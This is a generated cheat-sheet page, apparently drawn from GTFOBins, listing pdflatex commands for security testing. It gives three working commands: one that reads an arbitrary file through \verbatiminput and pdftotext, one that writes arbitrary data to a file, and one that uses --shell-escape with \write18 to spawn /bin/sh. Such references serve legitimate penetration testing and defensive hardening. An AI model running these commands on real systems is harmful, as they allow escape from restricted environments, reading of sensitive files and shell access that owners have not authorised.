---
parsed_by: focuslocust
source: commands
type: generated
---
# pdflatex Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## pdflatex

Tool page: [pdflatex](../../tools/linux/pdflatex.md)

### file-read

```text
pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
pdftotext texput.pdf -
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/pdflatex` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/pdflatex` |
| Evidence | Function example preserved from source parser. |

### shell

```text
pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/pdflatex` |
| Evidence | Function example preserved from source parser. |
